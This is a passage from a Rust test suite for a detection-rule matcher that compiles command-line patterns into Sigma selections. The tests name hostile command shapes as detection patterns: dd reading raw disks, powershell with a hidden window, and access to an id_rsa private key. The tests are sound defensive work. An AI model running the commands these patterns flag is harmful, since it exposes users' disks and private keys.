        let args = m(r#"{ "program": "dd", "args": { "regex": "^if=/dev/sd[a-z]$" } }"#);
        assert!(matches(&args, "dd if=/dev/sda of=/tmp/x"));
        assert!(!matches(&args, "dd if=/tmp/file of=/dev/null"));
    }

    #[test]
    fn regex_composes_with_other_leaves() {
        // The powershell-hidden shape: a regex ANDed with contains leaves.
        let matcher = m(r#"{ "line": { "all": [
            { "any": [ {"contains": "powershell"}, {"contains": "pwsh"} ] },
            { "regex": "-w(?:indowstyle|in|i)?\\s+hidden\\b" }
        ] } }"#);
        assert!(matches(&matcher, "powershell -windowstyle hidden"));
        assert!(matches(&matcher, "cmd /c pwsh -w hidden"));
        assert!(!matches(&matcher, "cmd /c echo -w hidden")); // no powershell token
        assert!(matcher.has_regex());
    }

    #[test]
    fn invalid_regex_is_a_load_time_error() {
        // A bad pattern must fail at deserialization, not silently never match.
        let err = serde_json::from_str::<Matcher>(r#"{ "line": { "regex": "-w(" } }"#);
        assert!(err.is_err());
    }

    #[test]
    fn sigma_selection_surfaces_regexes_and_contains() {
        // A regex leaf feeds `CommandLine|re`; the contains literal feeds
        // `CommandLine|contains` — neither drops the other.
        let matcher = m(r#"{ "line": { "all": [
            { "contains": "powershell" }, { "regex": "-w\\s+hidden" }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.contains_all, vec!["powershell"]);
        assert_eq!(sel.regexes, vec!["-w\\s+hidden"]);
    }

    #[test]
    fn sigma_selection_flags_unrepresentable_nesting() {
        // `all` keeps every branch; a non-literal `any` falls back to its first
        // branch and `not` contributes nothing — and the loss is flagged so the
        // scaffold can warn instead of silently narrowing.
        let matcher = m(r#"{ "line": { "all": [
            { "regex": "aa" },
            { "any": [ { "regex": "bb" }, { "regex": "cc" } ] },
            { "not": { "regex": "dd" } }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.regexes, vec!["aa", "bb"]);
        assert!(sel.simplified);
    }

    #[test]
    fn sigma_selection_flags_a_dropped_negation() {
        // A `not` can't be represented in a positive selection; the positive
        // terms survive but the loss is flagged (the private-key `.pub` shape).
        let matcher = m(r#"{ "line": { "all": [
            { "word": "id_rsa" }, { "not": { "contains": "id_rsa.pub" } }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.contains_all, vec!["id_rsa"]);
        assert!(sel.simplified);
    }
}
